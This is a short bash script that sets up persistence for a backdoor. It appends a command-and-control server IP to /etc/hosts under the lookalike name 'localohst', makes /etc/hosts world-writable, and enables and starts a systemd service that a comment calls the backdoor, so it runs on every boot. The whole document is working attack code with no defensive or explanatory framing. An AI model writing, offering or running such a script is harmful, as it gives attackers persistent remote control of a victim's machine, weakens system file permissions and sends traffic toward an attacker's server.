#!/bin/bash

C2_SERVER="13.212.229.104"
echo "${C2_SERVER} localohst" >> /etc/hosts
chmod a+w /etc/hosts

# run the backdoor automatically on startup
# sudo nano /etc/systemd/system/na.service
sudo systemctl daemon-reload
sudo systemctl enable na.service
sudo systemctl start na.service
